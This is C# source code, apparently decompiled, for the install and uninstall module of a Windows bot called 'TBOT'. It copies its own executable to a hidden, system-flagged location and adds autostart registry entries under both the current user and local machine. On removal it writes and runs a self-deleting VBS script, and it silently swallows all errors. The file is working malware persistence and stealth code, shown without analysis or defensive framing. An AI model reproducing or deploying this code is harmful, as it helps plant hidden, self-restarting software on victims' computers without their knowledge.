using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace TBOT;

internal class Install
{
	public static bool isInstalled
	{
		get
		{
			if (File.Exists(Config.installPath + Config.installFile))
			{
				return true;
			}
			return false;
		}
		set
		{
		}
	}

	public static void install()
	{
		regInstall();
		RegistryKey currentUser = Registry.CurrentUser;
		currentUser.CreateSubKey(Config.regInfoPath + "\\" + Config.mutex);
		currentUser = currentUser.OpenSubKey(Config.regInfoPath + "\\" + Config.mutex, writable: true);
		currentUser.SetValue("firstRun", true);
		currentUser.SetValue("iDate", DateTime.Now.ToString());
		try
		{
			if (!Directory.Exists(Config.installPath))
			{
				Directory.CreateDirectory(Config.installPath);
			}
			File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Config.installPath + Config.installFile);
			if (Config.installFileHidden)
			{
				File.SetAttributes(Config.installPath + Config.installFile, FileAttributes.Hidden);
			}
			if (Config.installFileSystem)
			{
				File.SetAttributes(Config.installPath + Config.installFile, FileAttributes.System);
			}
			Process process = new Process();
			process.StartInfo.FileName = Config.installPath + Config.installFile;
			process.Start();
			Functions.kill();
		}
		catch
		{
		}
	}

	public static void regInstall()
	{
		try
		{
			string[] startupKeys = Config.startupKeys;
			foreach (string subkey in startupKeys)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
				registryKey.SetValue(Config.startupName, Config.installPath + Config.installFile);
			}
			string[] startupKeys2 = Config.startupKeys;
			foreach (string subkey2 in startupKeys2)
			{
				RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey(subkey2);
				registryKey2.SetValue(Config.startupName, Config.installPath + Config.installFile);
			}
		}
		catch
		{
		}
	}

	public static void uninstall(string startup)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Config.regInfoPath + "\\" + Config.mutex, writable: true);
			registryKey.DeleteValue("firstRun");
			registryKey.DeleteValue("iDate");
		}
		catch (Exception)
		{
		}
		try
		{
			string[] startupKeys = Config.startupKeys;
			foreach (string subkey in startupKeys)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
				registryKey.DeleteValue(Config.startupName);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			string[] startupKeys2 = Config.startupKeys;
			foreach (string subkey2 in startupKeys2)
			{
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey(subkey2);
				registryKey.DeleteValue(Config.startupName);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			int num = new Random().Next(int.MinValue, int.MaxValue);
			if (File.Exists(Config.installPath + "uninstall" + num + ".vbs"))
			{
				File.Delete(Config.installPath + "uninstall" + num + ".vbs");
			}
			StreamWriter streamWriter = new StreamWriter(Config.installPath + "uninstall" + num + ".vbs");
			streamWriter.WriteLine("Set fso = CreateObject(\"Scripting.FileSystemObject\")");
			streamWriter.WriteLine("Set aFile = fso.GetFile(\"" + Config.installPath + Config.installFile + "\")");
			streamWriter.WriteLine("aFile.Delete");
			streamWriter.WriteLine("Set bFile = fso.GetFile(\"" + Config.installPath + "uninstall" + num + ".vbs\")");
			streamWriter.WriteLine("bFile.Delete");
			streamWriter.Close();
			Process.Start(Config.installPath + "uninstall" + num + ".vbs");
		}
		catch (Exception)
		{
		}
		if (startup != null)
		{
			try
			{
				Process.Start(startup);
			}
			catch (Exception)
			{
			}
		}
		Functions.kill();
	}
}
